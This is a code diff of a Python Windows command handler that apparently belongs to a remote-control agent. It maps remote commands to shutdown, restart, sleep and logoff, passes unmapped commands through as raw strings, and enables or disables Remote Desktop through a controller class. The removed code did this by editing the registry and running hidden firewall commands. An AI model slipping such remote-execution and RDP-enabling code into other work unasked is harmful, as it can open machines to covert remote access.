@@ -8,7 +8,10 @@ import os
 import shutil
 import datetime
 import ctypes
+import winreg
 from config import Config
+from monitoring.rdp_controller import RDPController
+from encryption.manager import EncryptionManager
 
 class CommandError(Exception):
     pass
@@ -91,23 +94,20 @@ class CommandHandler:
                 logging.error("No command provided")
             raise CommandError("No command provided")
         
-        # Map commands to Windows equivalents
         COMMAND_MAPPING = {
-            'shutdown': 'shutdown /s /t 0',  # Immediate shutdown
-            'restart': 'shutdown /r /t 0',   # Immediate restart
-            'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',  # Sleep mode
-            'signout': 'logoff',            # Log off current user
-            'startup': 'start notepad.exe'  # Example: Open Notepad (customize as needed)
+            'shutdown': 'shutdown /s /t 0',
+            'restart': 'shutdown /r /t 0',
+            'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
+            'signout': 'logoff',
+            'startup': 'start notepad.exe'
         }
         
-        # Check if running as admin for sensitive commands
         sensitive_commands = ['shutdown', 'restart', 'sleep', 'signout']
         if command.lower() in sensitive_commands and not ctypes.windll.shell32.IsUserAnAdmin():
             if Config.DEBUG_MODE:
-                logging.error(f"Command '{command}' requires admin privileges. Please run as administrator.")
-            raise CommandError(f"Command '{command}' requires admin privileges. Please run as administrator.")
+                logging.error(f"Command '{command}' requires admin privileges")
+            raise CommandError(f"Command '{command}' requires admin privileges")
         
-        # Apply command mapping
         actual_command = COMMAND_MAPPING.get(command.lower(), command)
         if Config.DEBUG_MODE:
             logging.info(f"Mapped command: {command} -> {actual_command}")
@@ -416,17 +416,14 @@ class CommandHandler:
     @staticmethod
     def handle_enable_rdp(params):
         try:
-            from monitoring.rdp_controller import RDPController
-            from encryption.manager import EncryptionManager
-            from config import Config
-
             rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
-            if rdp_controller.start():
+            result = rdp_controller.enable_rdp()
+            if result["status"] == "success":
                 logging.info("RDP enabled and configured successfully")
-                return {"status": "success", "message": "RDP enabled and configured"}
+                return result
             else:
-                logging.error("Failed to enable and configure RDP")
-                raise CommandError("Failed to enable and configure RDP")
+                logging.error(f"Failed to enable RDP: {result['message']}")
+                raise CommandError(f"Failed to enable RDP: {result['message']}")
         except Exception as e:
             logging.error(f"Enable RDP error: {str(e)}")
             raise CommandError(f"Enable RDP error: {str(e)}")
@@ -434,17 +431,14 @@ class CommandHandler:
     @staticmethod
     def handle_disable_rdp(params):
         try:
-            # غیرفعال‌سازی RDP از طریق رجیستری
-            key_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
-                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
-
-            # غیرفعال‌سازی Remote Desktop در فایروال
-            cmd = 'netsh advfirewall firewall set rule group="remote desktop" new enable=No'
-            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-
-            logging.info("RDP disabled successfully")
-            return {"status": "success", "message": "RDP disabled"}
+            rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
+            result = rdp_controller.disable_rdp()
+            if result["status"] == "success":
+                logging.info("RDP disabled successfully")
+                return result
+            else:
+                logging.error(f"Failed to disable RDP: {result['message']}")
+                raise CommandError(f"Failed to disable RDP: {result['message']}")
         except Exception as e:
             logging.error(f"Disable RDP error: {str(e)}")
             raise CommandError(f"Disable RDP error: {str(e)}")
